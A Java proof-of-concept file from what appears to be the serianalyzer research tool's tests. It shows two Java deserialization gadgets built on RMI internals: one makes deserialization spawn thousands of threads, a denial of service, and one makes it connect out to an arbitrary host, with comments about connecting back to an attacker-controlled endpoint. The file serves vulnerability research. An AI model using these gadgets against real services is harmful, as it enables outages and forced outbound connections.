/**
 * © 2015 AgNO3 Gmbh & Co. KG
 * All right reserved.
 * 
 * Created: 19.11.2015 by mbechler
 */
package eu.agno3.tools.serianalyzer.tests;


import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;


/**
 * @author mbechler
 *
 */
@SuppressWarnings ( "all" )
public class OraclePOC {

    // A - create an insane amount of system threads
    static void testDOSREFs () throws ClassNotFoundException, IOException, InterruptedException {
        ObjID id = new ObjID(1234);
        List<Object> refs = new ArrayList<>();
        for ( int i = 0; i < 100000; i++ ) {
            TCPEndpoint te = new TCPEndpoint("127.0.0.1", i); //$NON-NLS-1$
            refs.add(new UnicastRef(new LiveRef(id, te, false)));
        }

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(refs);

        System.out.println(bos.size());
        // one thread per endpoint
        try ( ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())) ) {
            ois.readObject();
        }

        Thread.sleep(10000);
    }


    // B - connect to the given TCP endpoint,
    static void testProxyREF ( String host, int port ) throws IOException {
        // Let's use the remote RMI registry
        // if there are others with callable methods, even worse
        ObjID id = new ObjID(0);
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry) Proxy.newProxyInstance(Tests.class.getClassLoader(), new Class[] {
            Remote.class, Registry.class, Map.class
        }, obj);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(proxy);

        try ( ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())) ) {
            // if one had a method hash collision for bind/rebind and
            // a method callable from a readObject
            // or one has another gadget that gives the invoke
            // this could be even more fun:
            // connect over multiple hops or connect back to a attacker controlled JMRP
            ois.readObject();

        }
        catch ( Throwable e ) {
            e.printStackTrace();
        }

    }

}
